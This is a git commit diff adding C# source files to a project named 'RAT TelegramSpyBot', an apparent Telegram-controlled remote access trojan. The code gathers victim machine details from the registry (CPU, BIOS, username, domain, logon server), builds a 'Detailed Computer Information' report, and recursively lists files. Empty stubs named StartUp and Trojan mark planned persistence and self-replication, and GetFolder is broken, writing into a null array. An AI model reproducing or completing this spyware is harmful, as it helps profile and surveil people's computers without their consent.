3a7c3df60de3f43a93b0a4af0a72a2ab01e277b0
SebastianEPH <sebastianeph99@gmail.com>
2020-05-29 16:22:16 -0500

    New functions

---
+++ RAT TelegramSpyBot/Lib/Features.cs
@@ -0,0 +1,89 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using Microsoft.Win32;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace RAT_BotTelegram.Lib {
+    internal sealed class Features {
+        public static string getArchitecture () {
+            // Obtiene la arquitecura del sistema operativo
+            try {
+                if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86")) {
+                    return "32 Bit";
+                } else {
+                    return "64 Bit";
+                }
+            } catch  {
+                return "[-]";
+            }
+        }
+        public static string getProcessorName() {
+            // Obtiene Nombre del procesador
+            try {
+                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("ProcessorNameString").ToString();
+            } catch {
+                return "[-]";
+            }
+        }
+        public static string getProcessorGhz() {
+            // Obtiene Nombre del procesador
+            try {
+                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("~MHz").ToString();
+            } catch{
+                return "[-]";
+            }
+        }
+        public static string getMotherboardName() {
+            // Obtiene Nombre del procesador
+            try {
+                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS").GetValue("SystemProductName").ToString();
+            } catch {
+                return "[-]";
+            }
+        }
+        public static string getMotherboardManufacturer() {
+            // Obtiene Nombre del procesador
+            try {
+                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS").GetValue("SystemManufacturer").ToString();
+            } catch  {
+                return "[-]";
+            }
+        }
+        public static string getBIOSVendor() {
+            // Obtiene Nombre del procesador
+            try {
+                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS").GetValue("BIOSVendor").ToString();
+            } catch  {
+                return "[-]";
+            }
+        }
+        public static string getUserName() {
+            // Obtiene Nombre del procesador
+            try {
+                return Registry.CurrentUser.OpenSubKey(@"Volatile Environment").GetValue("USERNAME").ToString();
+            } catch{
+                return "[-]";
+            }
+        }
+        public static string getUserDomain() {
+            // Obtiene Nombre del procesador
+            try {
+                return Registry.CurrentUser.OpenSubKey(@"Volatile Environment").GetValue("USERDOMAIN").ToString();
+            } catch {
+                return "[-]";
+            }
+        }
+
+        public static string getLogonServer() {
+            try {
+                return Registry.CurrentUser.OpenSubKey(@"Volatile Environment").GetValue("LOGONSERVER").ToString();
+            } catch {
+                return "[-]";
+            }
+        }
+    }
+}
+
---
+++ RAT TelegramSpyBot/Lib/Tools.cs
@@ -0,0 +1,93 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using Microsoft.Win32;
+using System.Threading.Tasks;
+using RAT_BotTelegram.Lib;
+using System.IO;
+using Microsoft.SqlServer.Server;
+
+namespace RAT_BotTelegram.Lib {
+    internal sealed class Tools {
+
+        public static String PC_Info() {
+            Console.WriteLine(Features.getArchitecture());
+            String Info = "Detailed Computer Information" +
+
+                "\n\n*UserData *" +
+                "\n - User Name: " + Features.getUserName() +
+                "\n - User Profile: C:\\User\\" + Features.getUserName() +
+                "\n - User Domain: " + Features.getUserName() +
+                "\n - Logon Server: " + Features.getLogonServer() +
+                "\n - AppData: C:\\Users\\" + Features.getUserName() + @"\AppData\Roaming " +
+                "\n - Home Path: \\Users\\" + Features.getUserName() +
+
+
+                "\n\n*Processor *" +
+                "\n - Name: " + Features.getProcessorName() +
+                "\n - Frequency: " + Features.getProcessorGhz() + " Ghz" +
+                "\n - Architecture: " + Features.getArchitecture() +
+
+
+                "\n\n*Motherboard *" +
+                "\n - Name: " + Features.getMotherboardName() +
+                "\n - Manufacturer: " + Features.getMotherboardManufacturer() +
+                "\n - BIOSVendor: " + Features.getBIOSVendor() +
+
+                "";
+            return Info;
+        }
+
+        public static string[] GetFile(string dir) {
+            // Obtiene Nombre del procesador
+            try {
+
+                string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
+                return allfiles;
+            } catch (Exception e) {
+                string[] allfiles = { "[-]" };
+                Console.WriteLine("La carpeta no existe: " + e);
+                return allfiles;
+            }
+        }
+        public static string[] GetFolder() {
+            // Obtiene Nombre del procesador
+            string[] allfiles = null;
+            int n = 0;
+            try {
+                foreach (string folder in Directory.GetDirectories(@"C:\")) {
+                    n = n + 1;
+                    allfiles[n] = folder;
+
+                    //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+                    //GetDirectoryAll(folder, indent + 2);
+                }
+            } catch (UnauthorizedAccessException) {
+            }
+
+
+
+            return allfiles;
+            //try {
+            //    string[] allFolder = Directory.GetDirectories(dir);
+            //    //string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
+            //    return allFolder;
+            //} catch (Exception e) {
+            //    string[] allfiles = { "[-]" };
+            //    Console.WriteLine("La carpeta no existe: " + e);
+            //    return allfiles;
+            //}
+        }
+
+        public static void StartUp() {  // Autoiniciar al iniciar sesión
+
+        }
+        public static void Trojan() {   // Se replica en el sistema 
+
+
+        }
+    
+    
+    }
+}
